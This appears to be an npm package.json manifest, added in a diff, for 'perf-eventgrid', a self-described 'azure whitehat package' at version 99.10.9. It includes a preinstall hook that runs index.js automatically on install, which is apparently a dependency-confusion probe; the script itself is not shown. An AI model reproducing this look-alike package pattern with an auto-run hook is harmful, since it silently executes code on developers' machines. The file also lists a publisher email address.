@@ -1,0 +1,39 @@
+{
+    "name": "perf-eventgrid",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-eventgrid@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-PF5AGAzodY+8p8k4v4oVOGb2Vg8sUzQx4+M35DAGZhTXkv0fU1HX5Jl5kdpwsRRrVwJQA9bEmF/FjurBWU43TA==",
+        "shasum": "fcdb70848ef7ac449d87ba68de98c15aa621d90b",
+        "tarball": "https://registry.npmjs.org/perf-eventgrid/-/perf-eventgrid-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3578,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon4ICRA9TVsSAnZWagAAWY8P/jlOYCA+0UNEu25lxd3F\nOk3BsF9ztJntdoZkJBdc/xmH+XqGOSdDrZvBWo5ObSK1vU8zuBXpOcOEpcnN\nNWoqH8XWvJcHc98juM+INhpnuw2+AdAW+suaGK25CUHRRMpgGYSIJtaQI51V\ncXY8XSq0tXYxQQLJVaS6Igj86a4Tr5sOUQwL2EhF86xkxHVL8cWj89HmzJoc\n8Z+9XSeWjbTzXcRZpAIrzmqKSPK1hK6naDboGGihtveU84z595QqsSxh/GwB\nXumckYWccb3LGRYdf3ZNPRSHUoQaCYKrZHm3JwvBnmCwaKKlWaJyciK94csi\nFS5pcO+J2XsupPA6BwoBYuQTllM5ihaZnlxEnRyoMGFAKMwzKt9BCwgmyTP9\nysjWH2ltIIDQQu7gW8Sdo0MxoZ/8Epe2630YVR/VgZBD4BrN0eox0CJg71r8\nnrbkdpw33pOgBGOIY5Zf9RBzHuJdIOvhfkKtsn7LBnpAPsO+b8uMXMnGj1VK\nfrxmaC9dVmyPx1N0FRjbhRdO5ruuY8TGDP/N897j+rX/gJO66TlLkbAXp0Ld\nl2+wxcd8rZ0+FqCHVinvQNw9zQ8NHNmZpDF0k6KxFcUfafoI7tIDpuxgulMS\n4vSAEHkMe+QpFZYco2hafJZ56LP0l1p6K/TLsEHUsreH0WIKTrq+A+HzwG5z\nJBTg\r\n=FeUx\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-eventgrid_99.10.9_1638039048200_0.7235856382969221"
+    },
+    "_hasShrinkwrap": false
+}
